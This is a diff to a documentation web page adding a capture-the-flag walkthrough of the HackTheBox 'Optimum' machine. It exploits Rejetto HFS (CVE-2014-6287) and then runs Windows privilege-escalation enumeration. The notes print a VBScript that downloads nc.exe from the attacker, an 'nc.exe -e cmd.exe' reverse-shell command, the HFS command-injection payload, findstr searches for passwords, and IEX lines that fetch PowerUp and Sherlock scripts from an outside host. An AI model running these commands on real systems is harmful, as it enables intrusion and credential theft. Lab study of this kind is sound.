@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-02-25T20:30:13 EST">
+<meta name="revised" content="2019-02-25T22:25:44 EST">
 <title>Optimum :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -509,6 +509,8 @@
     
     
 
+
+
 <p>NMAP</p>
 
 <pre><code>nmap -sV -sC 10.10.10.8  
@@ -527,6 +529,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds
 
 </code></pre>
+
+<h2 id="httpfileserver">HttpFileServer</h2>
+
+<p>Is a simple and easy to use File sharing service, that provides and web-portal to access the file system.</p>
+
+<p><img src="../../../../../../Users/charl/OneDrive/Pictures/hackthebox/optimum/hfs.PNG" alt="hfs" /></p>
 
 <p>SEARCHSPLOIT</p>
 
@@ -548,6 +556,193 @@ Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)             
 Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                  | exploits/windows/remote/39161.py
 Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                             | exploits/windows/webapps/34852.txt
 --------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+</code></pre>
+
+<p>Playing with Exploits</p>
+
+<p>CVE-2014-6287       Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution</p>
+
+<p>this is a pretty cool script</p>
+
+<pre><code>python exploit.py target-ip_addr target-port
+</code></pre>
+
+<p>nc</p>
+
+<pre><code>nc -lvnp 443
+</code></pre>
+
+<p>Change lines 35, 36</p>
+
+<p><img src="../../../../../../Users/charl/OneDrive/Pictures/hackthebox/optimum/cve-2014-6287.PNG" alt="cve-2014-6287" /></p>
+
+<p>I bumped into a problem on devel trying to get nc.exe to run using poewrshell. The script above got nc.exe to run and setup a reverse shell. i image this could be modified to be used elsewhere to get shells.****</p>
+
+<pre><code>C:\Users\Public\script.vbs|dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
+
+dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
+xHttp.Open &quot;GET&quot;, &quot;http://&quot; ip_addr &quot;/nc.exe&quot;, False
+xHttp.Send
+with bStrm
+    .type = 1 '//binary
+    .open
+    .write xHttp.responseBody
+    .savetofile &quot;C:\Users\Public\nc.exe&quot;, 2 '//overwrite
+end with
+</code></pre>
+
+<p>vbs2</p>
+
+<pre><code>cscript.exe C:\Users\Public\script.vbs
+</code></pre>
+
+<p>vbs3</p>
+
+<pre><code>&quot;C:\Users\Public\nc.exe -e cmd.exe &quot; ip_addr &quot; &quot; local_port&quot;&quot;
+</code></pre>
+
+<p>Regex is the culprit in the file parsetlib.pas <a href="https://www.exploit-db.com/exploits/34668">https://www.exploit-db.com/exploits/34668</a></p>
+
+<pre><code>function findMacroMarker(s:string; ofs:integer=1):integer;
+begin result:=reMatch(s, '\{[.:]|[.:]\}|\|', 'm!', ofs) end;
+</code></pre>
+
+<p>This part tripped me up buts literal</p>
+
+<pre><code>http://localhost:80/?search=%00{.exec|cmd.}
+</code></pre>
+
+<p>WINDOWS ENUMERATION</p>
+
+<p>whoami /priv</p>
+
+<pre><code>SeChangeNotifyPrivilege       Bypass traverse checking 			Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working		Disabled
+</code></pre>
+
+<p>Windows Clear text passwords.</p>
+
+<p>in order to deploy images across various system throughout a network. This misconfiguration is referenced to unattended installation when passwords or other information is saved on the image.</p>
+
+<pre><code>C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+</code></pre>
+
+<p>IIS could also suffere from this having administrator passwords store din plaintext in these web.config files. The first one is pretty interesting.</p>
+
+<pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+C:\inetpub\wwwroot\web.config
+</code></pre>
+
+<p>this below is not on the system.</p>
+
+<pre><code>C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
+\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
+</code></pre>
+
+<pre><code>findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+</code></pre>
+
+<pre><code>net users                                                                                        │01:22h, 16
+net users                                                                                                        │active    
+                                                                                                                 │[STATUS] 73
+User accounts for \\OPTIMUM                                                                                      │7.82 tries/
+                                                                                                                 │min, 117314
+-------------------------------------------------------------------------------                                  │ tries in 0Administrator            Guest                    kostas                                                         │2:39h, 5268
+The command completed successfully.                             
+</code></pre>
+
+<p>Lets checkout powersploit</p>
+
+<p>i didn&rsquo;t know that this loads everything into memory and thats how you access it. it loads the powershell commands .</p>
+
+<pre><code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.14/PowerUp.ps1')
+Invoke-AllChecks 
+</code></pre>
+
+<p>SHERLOCK</p>
+
+<pre><code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.14/sherlock.ps1')
+</code></pre>
+
+<pre><code>Find-AllVulns
+</code></pre>
+
+<pre><code>Title      : User Mode to Ring (KiTrap0D)                                                                             [55/68]
+MSBulletin : MS10-015                                                                                                        
+CVEID      : 2010-0232                      
+Link       : https://www.exploit-db.com/exploits/11199/                                                                     
+VulnStatus : Not supported on 64-bit systems               
+                                                       
+Title      : Task Scheduler .XML            
+MSBulletin : MS10-092                                  
+CVEID      : 2010-3338, 2010-3888  
+Link       : https://www.exploit-db.com/exploits/19930/                                                                     
+VulnStatus : Not Vulnerable        
+                                                       
+Title      : NTUserMessageCall Win32k Kernel Pool Overflow
+MSBulletin : MS13-053                                  
+CVEID      : 2013-1300                                                                                                      
+Link       : https://www.exploit-db.com/exploits/33213/
+VulnStatus : Not supported on 64-bit systems                                                                                
+
+Title      : TrackPopupMenuEx Win32k NULL Page
+MSBulletin : MS13-081
+CVEID      : 2013-3881
+Link       : https://www.exploit-db.com/exploits/31576/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenu Win32k Null Pointer Dereference
+MSBulletin : MS14-058
+CVEID      : 2014-4113
+Link       : https://www.exploit-db.com/exploits/35101/
+VulnStatus : Not Vulnerable
+
+Title      : ClientCopyImage Win32k
+MSBulletin : MS15-051
+CVEID      : 2015-1701, 2015-2433
+Link       : https://www.exploit-db.com/exploits/37367/
+VulnStatus : Not Vulnerable
+
+Title      : Font Driver Buffer Overflow
+MSBulletin : MS15-078
+CVEID      : 2015-2426, 2015-2433
+Link       : https://www.exploit-db.com/exploits/38222/
+VulnStatus : Not Vulnerable
+
+Title      : 'mrxdav.sys' WebDAV
+MSBulletin : MS16-016
+CVEID      : 2016-0051
+Link       : https://www.exploit-db.com/exploits/40085/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+
+Title      : Windows Kernel-Mode Drivers EoP
+MSBulletin : MS16-034
+CVEID      : 2016-0093/94/95/96
+Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
+VulnStatus : Appears Vulnerable
+
+Title      : Win32k Elevation of Privilege
+MSBulletin : MS16-135
+CVEID      : 2016-7255
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
+VulnStatus : Appears Vulnerable
+Title      : Nessus Agent 6.6.2 - 6.10.3
+MSBulletin : N/A
+CVEID      : 2017-7199
+Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
+VulnStatus : Not Vulnerable
 </code></pre>
 
 
